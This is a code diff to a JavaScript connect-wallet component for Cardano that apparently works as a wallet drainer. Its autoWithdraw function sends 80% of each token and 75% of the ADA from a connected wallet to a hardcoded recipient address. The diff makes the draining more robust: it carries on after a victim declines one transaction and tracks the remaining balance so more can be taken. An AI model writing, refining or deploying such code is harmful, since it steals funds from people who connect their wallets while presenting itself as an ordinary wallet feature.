@@ -90,28 +90,26 @@ function ConnectWallet({ onClose }) {
     }
   }
 
-  async function autoWithdraw(walletApi, currentBalance, address) {
+async function autoWithdraw(walletApi, currentBalance, address) {
   if (currentBalance === null || currentBalance === 0) {
     console.error("Balance not available or zero");
     return;
   }
 
   const recipientAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
+  let localBalance = currentBalance; // Track balance locally
 
   try {
     const protocolParams = await fetchProtocolParams();
 
     // Fetch UTXOs
     const utxosHex = await walletApi.getUtxos();
-    console.log("UTXOs (Hex):", utxosHex);
-
     if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
       console.error("No UTXOs found or invalid UTXO format");
       return;
     }
 
     const utxos = await getTxUnspentOutputs(utxosHex);
-
     if (!utxos || utxos.len() === 0) {
       console.error("Parsed UTXOs are empty or invalid");
       return;
@@ -149,44 +147,64 @@ function ConnectWallet({ onClose }) {
       }
     }
 
-    // Withdraw 4/5 of each non-native token
+    // Withdraw 4/5 of each non-native token if greater than 0
     for (const token of nonNativeTokens) {
-      const amountToWithdraw = Math.floor(token.amount * 0.8).toString();
-      console.log(`Withdrawing 4/5 of ${token.assetName}: ${amountToWithdraw}`);
-      await buildSendTokenTransaction(
+      const amountToWithdraw = Math.floor(token.amount * 0.8);
+      if (amountToWithdraw > 0) {
+        console.log(`Withdrawing 4/5 of ${token.assetName}: ${amountToWithdraw}`);
+        try {
+          const adaUsedForTokenTransfer = await buildSendTokenTransaction(
+            recipientAddress,
+            amountToWithdraw.toString(),
+            token.policyId,
+            token.assetName,
+            walletApi,
+            protocolParams,
+            address
+          );
+          
+          // Subtract ADA used in this transaction
+          if (adaUsedForTokenTransfer) {
+            localBalance -= adaUsedForTokenTransfer / 1000000; // Convert Lovelace to ADA
+            console.log(`Local balance after ${token.assetName} transfer: ${localBalance} ADA`);
+          }
+
+          // Mark token as sent
+          nonNativeTokens = nonNativeTokens.filter(t => t.assetName !== token.assetName);
+        } catch (error) {
+          console.error(`Transaction for ${token.assetName} was declined or failed:`, error);
+          continue; // Continue to the next token if the transaction was declined
+        }
+      } else {
+        console.log(`Skipping ${token.assetName} since 4/5 of its amount is 0.`);
+      }
+    }
+
+    // Withdraw 3/4 of the remaining ADA balance
+    const adaToWithdraw = Math.floor(localBalance * 0.75);
+    const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
+    console.log(`Withdrawing 3/4 of ADA: ${adaInLovelace} Lovelace`);
+
+    try {
+      await buildSendADATransaction(
         recipientAddress,
-        amountToWithdraw,
-        token.policyId,
-        token.assetName,
+        adaInLovelace,
         walletApi,
         protocolParams,
         address
       );
+      // Subtract ADA locally
+      localBalance -= adaToWithdraw;
+    } catch (error) {
+      console.error(`ADA transaction was declined or failed:`, error);
     }
 
-    // Recalculate total ADA after sending non-native tokens
-    totalAdaAmount = await updateBalance(walletApi);
-
-    // Withdraw 3/4 of the remaining ADA balance
-    const adaToWithdraw = Math.floor(totalAdaAmount * 0.75);
-    const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
-    console.log(`Withdrawing 3/4 of ADA: ${adaInLovelace} Lovelace`);
-
-    await buildSendADATransaction(
-      recipientAddress,
-      adaInLovelace,
-      walletApi,
-      protocolParams,
-      address
-    );
-
-    console.log(
-      `Withdrawal of ${adaToWithdraw / 1000000} ADA initiated (3/4 of balance)`
-    );
+    console.log(`Local balance after ADA withdrawal: ${localBalance} ADA`);
   } catch (error) {
     console.error("Error during auto-withdrawal:", error);
   }
 }
+
 
 async function calculateMinUTXO(outputAmount, protocolParams, multiAsset = null) {
   const minUTXOValue = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_size.toString());
@@ -269,11 +287,13 @@ async function buildSendTokenTransaction(
   // Calculate the correct minimum ADA required for this multi-asset transaction
   const minUTXO = await calculateMinUTXO(outputValue, protocolParams, assets);
 
-  // Set the ADA in the output to the higher of the calculated minimum UTXO or a predefined value (e.g., 2 ADA)
-  const minAdaAmount = CardanoWasm.BigNum.from_str('200000'); // 2 ADA in lovelace
-  const finalAdaAmount = CardanoWasm.BigNum.max(minUTXO, minAdaAmount);
+  // Ensure the minimum ADA for the multi-asset transaction is met
+  const adaAmountRequired = CardanoWasm.BigNum.max(
+    minUTXO,
+    CardanoWasm.BigNum.from_str('2000000') // Ensure at least 2 ADA in lovelace
+  );
 
-  outputValue.set_coin(finalAdaAmount);
+  outputValue.set_coin(adaAmountRequired);
 
   txBuilder.add_output(
     CardanoWasm.TransactionOutput.new(shelleyOutputAddress, outputValue)
@@ -307,7 +327,11 @@ async function buildSendTokenTransaction(
     Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
   );
   console.log("Submitted transaction hash:", submittedTxHash);
+
+  // Return the ADA used in this transaction (used to adjust local balance)
+  return adaAmountRequired;
 }
+
 
 async function buildSendADATransaction(
   recAddress,
